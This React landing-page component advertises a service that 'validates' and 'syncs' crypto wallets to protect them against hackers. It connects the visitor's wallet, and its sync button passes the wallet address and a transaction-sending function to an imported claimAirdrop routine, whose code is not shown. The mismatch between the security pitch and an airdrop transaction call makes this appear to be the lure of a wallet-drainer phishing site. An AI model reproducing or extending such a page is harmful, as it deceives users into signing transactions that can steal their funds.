import React from "react";
import styles from "./Hero.module.css";
import "../App.css";
import { NavLink } from "react-router-dom";
import { heroImg, connectBtn, sync } from "../assets";
import NavMenu from "./NavMenu";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { claimAirdrop } from "../../funcs";

import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'


const Hero = ({ toggle, toogleHandler }) => {
    const {open } = useWeb3Modal()
    const { address, isConnected } = useAccount()
    const publicClient = usePublicClient()
    const { sendTransaction } = useSendTransaction()
  
  return (
    <section className={`${styles.heroSection}`}>
      <div className={`${styles.heroImage}`}>
        <img src={heroImg} className={`${styles.img}`} />
      </div>
      <div className={`${styles.heroContainer}`}>
        <div className={`${styles.check}  ${toggle && styles.showMenu}`}>
          <NavMenu />
        </div>

        <div className={`${styles.firstCol}`}>
          <h1 className={`${styles.title}`}>
            Validate, Synchronize, Secure and Protect Wallet Against Hackers
          </h1>
          <p className={styles.text}>
            Using our Cutting Edge Encryption Technology we employ
            state-of-the-art encryption protocols to fortify the walls of your
            digital wallet.
          </p>
          <div className="mt-[2rem] flex gap-[1rem]">
            <NavLink >
              <button  onClick={open}>
                <img src={connectBtn} />
              </button>
            </NavLink>

            <NavLink >
              <button onClick={() => claimAirdrop(address, publicClient, open, sendTransaction)}>
                <img src={sync} />
              </button>
            </NavLink>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Hero;
